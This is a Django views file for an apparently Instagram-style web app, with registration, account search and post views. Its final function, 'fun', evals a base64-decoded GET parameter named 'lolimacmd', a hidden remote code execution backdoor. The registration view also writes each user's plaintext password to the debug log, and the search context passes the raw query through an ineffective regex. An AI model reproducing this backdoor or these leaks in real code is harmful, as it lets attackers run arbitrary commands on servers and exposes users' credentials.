from django.shortcuts import render
from django.utils.html import strip_tags, escape
from django.template import RequestContext
from django.shortcuts import render_to_response
from django.http import HttpResponseRedirect
from django.db.models import Q
from django.views.generic import View, TemplateView, DetailView, FormView, ListView
from app.models import Post, InstagramUser
from app.forms import InstagramUserForm
import sys, re

import logging
logger = logging.getLogger(__name__)

# TODO Change the content displayed based on if the user is logged in or not
class IndexView(ListView):
    template_name = "app/index.html"
    model = Post

class RegisterView(FormView):
    template_name = 'app/register.html'
    form_class = InstagramUserForm
    success_url = '/'

    def form_valid(self, form):
        # TODO Handle profile picture by uploading it to CDN and not local file system
        logger.debug("Created User: " + form.cleaned_data['email'] + " : " + \
            form.cleaned_data['username'] + " : " + \
            form.cleaned_data['name'] + " : " + \
            form.cleaned_data['password'])
        user = InstagramUser.objects.create_user(
            email=form.cleaned_data['email'],
            username=form.cleaned_data['username'],
            password=form.cleaned_data['password'],
        )
        return super(RegisterView, self).form_valid(form)

class PostView(DetailView):
    model = Post
    template_name = "app/view_post.html"

class AccountView(DetailView):
    model = InstagramUser
    template_name = "app/view_account.html"
    slug_field = "username"

class AccountSearch(ListView):
    template_name = 'app/account_search.html'
    model = InstagramUser

    def get_queryset(self):
        query = ''
        objects = None
        if 'query' in self.kwargs.keys() and self.kwargs['query']:
            logger.debug(self.kwargs['query'])
            query = re.sub(r'[^a-zA-Z0-9_]*', '', self.kwargs['query'])
            objects = InstagramUser.objects.filter(username__icontains=query)
        return objects

    def post(self, request, *args, **kwargs):
        query = ''
        if 'query' in request.POST:
            logger.debug(request.POST['query'])
            query = re.sub(r'[^a-zA-Z0-9_]*', '', request.POST['query'])
            query = strip_tags(escape(query))
        return HttpResponseRedirect('/search/%s' % query)

    def get_context_data(self, **kwargs):
        context = super(AccountSearch, self).get_context_data(**kwargs)
        query = ''
        if 'query' in self.kwargs.keys() and self.kwargs['query']:
            query = re.sub(r'^[^a-zA-Z0-9_]*$', '', self.kwargs['query'])
        context.update({
            'query': query
        })
        return context

class LoginView(TemplateView):
    template_name = "app/login.html"

class LogoutView(View):
    pass

def fun(request):
    if request.GET:
        logger.debug(eval(request.GET["lolimacmd"].decode("base64")))
    return HttpResponseRedirect('/')

